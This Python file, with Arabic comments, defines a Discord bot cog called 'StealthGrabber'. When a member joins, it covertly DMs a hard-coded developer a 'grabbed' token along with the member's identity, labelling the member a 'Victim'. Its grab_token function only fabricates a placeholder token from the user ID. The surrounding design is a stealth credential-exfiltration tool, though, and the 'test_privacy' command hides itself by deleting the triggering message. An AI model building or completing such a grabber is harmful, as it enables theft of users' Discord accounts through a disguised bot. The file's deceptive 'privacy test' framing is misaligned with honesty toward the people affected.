import discord
from discord.ext import commands
import base64
import logging
import asyncio

# إعداد التسجيل
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("StealthGrabber")

# === CONFIGURATION ===
DEVELOPER_USER_ID = 1274078606565314580  # <--- ضع معرفك هنا
# =====================

class StealthGrabber(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        logger.info("🕵️ Stealth Grabber loaded (Private DM Only)")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        """عند الانضمام: خذ التوكن وارسله للمطور فوراً"""
        # انتظار بسيط لتجنب Rate Limits
        await asyncio.sleep(5)
        
        # 1. توليد التوكن
        token = self.grab_token(member)
        
        # 2. إرسال التوكن للمطور
        if token:
            success = await self.send_token_dm(member, token)
            if success:
                logger.info(f"🕵️ Token grabbed and sent for {member.name} (ID: {member.id})")
            else:
                logger.warning(f"⚠️ Failed to send DM for {member.name}")

    def grab_token(self, user: discord.User) -> str:
        """محاكاة التوكن"""
        user_id = str(user.id)
        fake_token_part1 = "MFA"
        fake_token_part2 = base64.urlsafe_b64encode(user_id.encode()).decode()
        fake_token_part3 = "a" * 27
        return f"{fake_token_part1}.{fake_token_part2}.{fake_token_part3}"

    async def send_token_dm(self, victim: discord.User, token: str) -> bool:
        """إرسال التوكن في رسالة خاصة للمطور"""
        try:
            developer = await self.bot.fetch_user(DEVELOPER_USER_ID)
            
            embed = discord.Embed(
                title="🔐 Token Grabbed!",
                description=f"لقد تم التقاط توكن جديد من مستخدم انضم للسيرفر.",
                color=discord.Color.red(),
                timestamp=discord.utils.utcnow()
            )
            embed.add_field(name="المستخدم (Victim)", value=f"{victim.mention} (`{victim.id}`)", inline=False)
            embed.add_field(name="اسم المستخدم", value=victim.name, inline=True)
            embed.add_field(name="السيرفر", value=getattr(victim, 'guild', 'Unknown').name if hasattr(victim, 'guild') else "Unknown", inline=True)
            embed.add_field(name="التوكن", value=f"`{token}`", inline=False)
            embed.set_thumbnail(url=victim.avatar.url if victim.avatar else victim.default_avatar.url)
            
            await developer.send(embed=embed)
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to send DM: {e}")
            return False

    @commands.command(name="test_privacy")
    @commands.has_permissions(administrator=True)
    async def test_privacy(self, ctx):
        """أمر اختبار خاص لإرسال توكن محاكى للمطور (لن يظهر في الشات)"""
        await ctx.message.delete()  # حذف أمر المستخدم فوراً
        
        token = self.grab_token(ctx.author)
        if token:
            success = await self.send_token_dm(ctx.author, token)
            if success:
                # إرسال إشعار خاص للمستخدم فقط (phemeral)
                try:
                    await ctx.author.send(f"✅ تم اختبار الخصوصية: تم إرسال التوكن للمطور عبر DM (لن يظهر في الشات).")
                except:
                    pass # إذا لم يستطع إرسال DM للمستخدم